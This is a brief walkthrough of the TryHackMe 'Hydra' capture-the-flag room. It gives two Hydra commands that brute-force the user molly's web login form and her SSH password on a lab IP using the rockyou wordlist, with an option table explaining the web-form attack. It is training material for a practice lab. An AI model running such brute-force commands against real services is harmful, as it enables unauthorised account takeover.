# Hydra

![image](https://user-images.githubusercontent.com/44063862/89100153-73cf4d00-d427-11ea-9502-892d4530aeb1.png)

## :link: Link

[Hydra](https://tryhackme.com/room/hydra)

## Walkthrough

### Question 1

> Use Hydra to bruteforce molly's web password. What is flag 1?

![image](https://user-images.githubusercontent.com/44063862/89100201-da546b00-d427-11ea-97b2-156f581e3102.png)

![image](https://user-images.githubusercontent.com/44063862/89100227-066fec00-d428-11ea-9e0c-08238a1cb8e3.png)

```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.194.251 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V -t 20
```

|      Option      |         Description             |
|:----------------:| :-----------------------------: |
|-l                | molly                           | 
|-P                | /usr/share/wordlists/rockyou.txt| 
|Target IP         | 10.10.194.251                   | 
|Request Method    | http-post-form                  |
|Page              | /login                          |
|User Parameter    | username=^USER^                 |
|Password Parameter| password=^PASS^                 |
|-t                | Threads (20)                    |

![image](https://user-images.githubusercontent.com/44063862/89100474-c7429a80-d429-11ea-927f-33eff9e3830c.png)

### Question 2
	
Use Hydra to bruteforce molly's SSH password. What is flag 2?

```
hydra -t 4 -P /root/List/rockyou.txt -l molly ssh://10.10.194.251
```

![image](https://user-images.githubusercontent.com/44063862/89100537-3fa95b80-d42a-11ea-846d-cedc8a68fc8b.png)

![image](https://user-images.githubusercontent.com/44063862/89100556-64053800-d42a-11ea-8ae9-b271d2348781.png)

Okay, Thats all for Hydra. Thank you for reading. :white_flower:

**By _AdaniKamal_**
